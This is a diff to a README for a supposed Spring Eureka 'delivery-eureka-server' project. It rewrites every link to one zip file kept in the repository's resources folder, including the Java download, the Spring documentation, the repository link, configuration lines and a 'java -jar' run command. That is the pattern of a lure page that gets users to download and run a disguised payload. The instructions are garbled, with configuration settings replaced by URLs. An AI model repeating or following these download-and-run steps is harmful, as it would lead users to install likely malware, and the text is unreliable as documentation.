@@ -1,6 +1,6 @@
 # 🚀 delivery-eureka-server - Seamless Service Discovery for Delivery Systems
 
-[![Download delivery-eureka-server](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip%20Now-Get%20Started-4CAF50?logo=github)](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip)
+[![Download delivery-eureka-server](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip%20Now-Get%20Started-4CAF50?logo=github)](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run delivery-eureka-server on your sys
 ### 🔍 System Requirements
 
 - **Operating System:** Windows 10 or above, MacOS, or Linux
-- **Java Version:** JDK 11 or higher installed. You can download it [here](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip).
+- **Java Version:** JDK 11 or higher installed. You can download it [here](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip).
 - **Memory:** At least 512 MB of RAM
 - **Disk Space:** A minimum of 100 MB free disk space
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run delivery-eureka-server on your sys
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
    
-   [Download delivery-eureka-server](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip)
+   [Download delivery-eureka-server](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip)
 
 2. **Select the Latest Release:** Look for the latest version. It usually displays at the top of the page.
 
@@ -45,7 +45,7 @@ Follow these simple steps to download and run delivery-eureka-server on your sys
 3. **Run the Application:**
    Use this command to start the delivery-eureka-server:
    ```bash
-   java -jar https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip
+   java -jar https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip
    ```
 
 4. **Access the Server:** Open your web browser and go to `http://localhost:8761/` to access the Eureka dashboard.
@@ -54,13 +54,13 @@ Follow these simple steps to download and run delivery-eureka-server on your sys
 
 You can modify how delivery-eureka-server runs by using configuration files. Here are a few basic settings:
 
-- **Server Port:** Change the port by editing the `https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip` file. Add or modify the line:
+- **Server Port:** Change the port by editing the `https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip` file. Add or modify the line:
   ```
-  https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip
+  https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip
   ```
 - **Service Name:** You can set your service's name:
   ```
-  https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip
+  https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip
   ```
 
 ### ✅ Basic Usage
@@ -78,8 +78,8 @@ Once the server is running, you can:
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [delivery-eureka-server](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip)
-- Documentation for Spring Cloud Netflix Eureka: [Spring Cloud](https://raw.githubusercontent.com/ethandivers/delivery-eureka-server/master/S/delivery-eureka-server.zip)
+- GitHub Repository: [delivery-eureka-server](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip)
+- Documentation for Spring Cloud Netflix Eureka: [Spring Cloud](https://github.com/ethandivers/delivery-eureka-server/raw/refs/heads/master/src/main/resources/delivery_server_eureka_3.1.zip)
 
 ## 📞 Support
 
